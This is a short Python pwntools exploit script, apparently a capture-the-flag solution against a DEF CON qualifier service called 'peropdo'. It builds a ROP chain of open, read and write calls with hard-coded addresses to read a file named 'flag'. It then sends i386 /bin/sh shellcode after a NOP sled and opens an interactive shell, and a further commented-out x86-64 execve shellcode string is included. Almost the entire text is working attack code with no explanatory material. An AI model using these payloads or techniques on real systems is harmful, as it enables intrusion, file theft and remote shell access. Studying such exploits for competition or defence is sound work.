#!/usr/bin/python -i

from pwn import *

host = '127.0.0.1'
port = 2323

host = 'peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me'
port = 80
r = remote(host, port)

raw_input('continue ->')

# type=1: client, head
# type=0: server

# idx>0 -> chain msgs

# idx>=2 -> not take effect

p = ''



shellcode1 = asm("""
push eax
pop ecx
xor ebx,ebx
push 3
pop eax
push 0x7f
pop edx
int 0x80
""")

p = ''

sbase=0x80ecfc4
filename=sbase
prot=sbase+8

libc_open=0x806d730

read=0x806d7a0

write=0x806d810

pop3=0x804841d

p+=p32(15153473)
p+="flag\0\0\0\0r\0\0\0"

p=p.ljust(0x91,'\0')

rop=''

rop+=p32(libc_open)
rop+=p32(pop3)
rop+=p32(filename)
rop+=p32(0)
rop+=p32(0)

rop+=p32(read)
rop+=p32(pop3)
rop+=p32(3)
rop+=p32(sbase)
rop+=p32(128)

rop+=p32(write)
rop+=p32(pop3)
rop+=p32(1)
rop+=p32(sbase)
rop+=p32(128)



p+=rop
p+='\n'

p+='23\nn\n'

r.send(p)

#shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode = '\x90' * 20 + asm(shellcraft.i386.sh())

print 'recv:'
print repr(r.recvrepeat(1))

r.send(shellcode)

r.interactive()

#r.interactive()
